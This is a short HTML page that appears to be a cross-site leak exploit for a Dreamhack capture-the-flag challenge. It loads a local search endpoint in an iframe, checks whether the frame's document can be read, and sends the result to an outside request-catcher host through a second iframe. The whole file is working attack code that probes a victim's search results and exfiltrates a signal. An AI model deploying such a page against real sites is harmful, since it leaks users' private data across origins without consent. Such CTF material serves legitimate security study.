
<html>
    <head>
        <script>
            const afterLoad = function() {
                  const iframe = document.createElement("iframe")
                  let text = "";
                  try {
                      text = document.getElementsByTagName("iframe")[0].contentWindow.document
                      text = "yesyes"
                      
                  } catch (error) {
                      text = "NoNo"
                  }
                  iframe.src = "https://syleaie.request.dreamhack.games/" + text
                  document.body.append(iframe)
              }
          </script>
    </head> 
      <body>
    
          <iframe src="http://127.0.0.1:8000/search?query=D" id="query" onerror="afterLoad()" onload="afterLoad()"></iframe>
      </body>
</html>
